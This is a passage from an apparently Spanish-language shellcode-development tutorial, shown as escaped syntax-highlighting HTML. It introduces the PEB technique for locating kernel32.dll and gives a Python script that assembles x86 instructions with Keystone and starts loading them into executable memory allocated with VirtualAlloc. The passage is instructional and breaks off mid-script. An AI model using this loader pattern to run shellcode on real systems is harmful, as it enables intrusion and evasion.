&lt;p&gt;Se creará un script de python que ejecute los pasos mencionados anteriormente empleando la ténica PEB para poder recuperar la dirección base de &lt;code&gt;kernel32.dll&lt;&#x2F;code&gt;, que exporta funciones que necesitaremos posteriormente.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-python&quot;&gt;import&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-import-list z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;struct&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-from z-python&quot;&gt;from&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-source z-python&quot;&gt; &lt;span class=&quot;z-meta z-import-path z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-name z-python&quot;&gt;keystone&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-python&quot;&gt;import&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt; &lt;span class=&quot;z-constant z-language z-import-all z-python&quot;&gt;*&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-other z-constant z-python&quot;&gt;CODE&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-group z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;int3;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Breakpoint para WinDbg
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov ebp, esp;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;sub esp, 60h;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ks&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;Ks&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-other z-constant z-python&quot;&gt;KS_ARCH_X86&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-other z-constant z-python&quot;&gt;KS_MODE_32&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inicializar el motor keystone en 32 bits
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;encoding&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;, &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;count&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ks&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;asm&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-other z-constant z-python&quot;&gt;CODE&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;Encoded &lt;span class=&quot;z-constant z-other z-placeholder z-python&quot;&gt;%d&lt;&#x2F;span&gt; instructions...&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;%&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;count&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;sh&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-statement z-loop z-for z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-loop z-for z-python&quot;&gt;for&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;e&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-control z-loop z-for z-in z-python&quot;&gt;in&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-loop z-for z-python&quot;&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;encoding&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-loop z-for z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-loop z-for z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;sh&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;struct&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;pack&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;B&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;e&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-type z-python&quot;&gt;bytearray&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;sh&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ptr&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;windll&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;kernel32&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;VirtualAlloc&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;c_int&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;0&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;c_int&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;len&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;c_int&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-hexadecimal z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-numeric z-base z-python&quot;&gt;0x&lt;&#x2F;span&gt;3000&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;c_int&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-hexadecimal z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-numeric z-base z-python&quot;&gt;0x&lt;&#x2F;span&gt;40&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;buf&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-group z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;ctypes&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;c_char&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;*&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;len&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;from_buffer&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
